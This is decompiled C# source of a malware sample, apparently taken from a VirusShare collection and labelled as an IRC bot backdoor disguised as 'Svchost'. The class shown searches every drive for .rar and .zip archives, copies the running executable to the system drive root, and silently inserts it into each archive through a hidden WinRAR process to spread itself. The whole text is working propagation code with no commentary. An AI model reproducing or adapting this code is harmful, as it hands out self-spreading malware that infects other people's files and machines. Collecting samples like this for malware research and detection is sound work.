// Decompiled with JetBrains decompiler
// Type: myApp.Rar
// Assembly: Svchost, Version=1.0.3797.25400, Culture=neutral, PublicKeyToken=null
// MVID: E157A03A-FE69-4E7B-AD46-73B5B6218564
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00006-msil\Backdoor.MSIL.IrcBot.fy-ac791d112cad6f2a883c24cb5a554f1a826fa0afc8bb0e0be6dada5ff2c5a16d.exe

using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;

namespace myApp
{
  public class Rar
  {
    public static int Icounts = 0;
    private static string _rarPath;
    private static string _copiedExeName;

    [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
    public static extern int GetShortPathName(
      [MarshalAs(UnmanagedType.LPTStr)] string path,
      [MarshalAs(UnmanagedType.LPTStr)] StringBuilder shortPath,
      int shortPathLength);

    private static void Search(string pathName)
    {
      foreach (string file in Directory.GetFiles(pathName))
      {
        if (file.Contains(".rar"))
          Rar.RarStart(file);
        if (file.Contains(".zip"))
          Rar.RarStart(file);
      }
      foreach (string directory in Directory.GetDirectories(pathName))
        Rar.Search(directory);
    }

    public static void Spread(string myExeName)
    {
      Rar._copiedExeName = myExeName;
      foreach (string logicalDrive in Environment.GetLogicalDrives())
        Rar.Search(logicalDrive);
      if (Rar.Icounts == 0)
        return;
      Program.InfectedArchives = Rar.Icounts;
    }

    public static void RarStart(string archiveToInject)
    {
      string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.System);
      string path1 = folderPath.Replace(folderPath.Substring(folderPath.IndexOf("\\")), string.Empty) + "\\";
      Rar._rarPath = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + "\\WinRAR\\WinRAR.exe";
      if (!File.Exists(Rar._rarPath))
        return;
      if (!File.Exists(Path.Combine(path1, Rar._copiedExeName)))
        File.Copy(Process.GetCurrentProcess().MainModule.FileName, Path.Combine(path1, Rar._copiedExeName));
      StringBuilder shortPath1 = new StringBuilder((int) byte.MaxValue);
      Rar.GetShortPathName(Path.Combine(path1, Rar._copiedExeName), shortPath1, shortPath1.Capacity);
      string str1 = shortPath1.ToString();
      StringBuilder shortPath2 = new StringBuilder((int) byte.MaxValue);
      Rar.GetShortPathName(archiveToInject, shortPath2, shortPath2.Capacity);
      try
      {
        ProcessStartInfo startInfo = new ProcessStartInfo();
        string str2 = " a " + (object) shortPath2 + " " + str1;
        startInfo.FileName = Rar._rarPath;
        startInfo.Arguments = str2;
        startInfo.WindowStyle = ProcessWindowStyle.Hidden;
        Process.Start(startInfo);
        ++Rar.Icounts;
      }
      catch
      {
      }
    }
  }
}
